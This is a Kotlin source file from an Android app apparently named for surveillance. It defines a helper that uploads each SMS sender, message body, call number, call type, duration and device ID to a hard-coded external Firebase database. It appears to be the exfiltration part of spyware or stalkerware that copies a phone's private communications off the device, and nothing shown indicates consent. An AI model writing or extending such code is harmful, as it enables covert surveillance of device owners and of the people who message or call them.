package com.kuzatuv.app

import com.google.firebase.database.FirebaseDatabase
import java.util.UUID

object FirebaseHelper {

    private val db by lazy {
        FirebaseDatabase.getInstance("https://aniq-a29bf-default-rtdb.asia-southeast1.firebasedatabase.app")
    }

    fun pushSms(sender: String, body: String, timestamp: Long, device: String) {
        val id = UUID.randomUUID().toString()
        val data = mapOf(
            "sender" to sender,
            "body" to body,
            "timestamp" to timestamp,
            "device" to device
        )
        db.getReference("sms").child(id).setValue(data)
    }

    fun pushCall(number: String, type: String, timestamp: Long, durationSec: Long, device: String) {
        val id = UUID.randomUUID().toString()
        val data = mapOf(
            "number" to number,
            "type" to type,
            "timestamp" to timestamp,
            "duration" to durationSec,
            "device" to device
        )
        db.getReference("calls").child(id).setValue(data)
    }
}
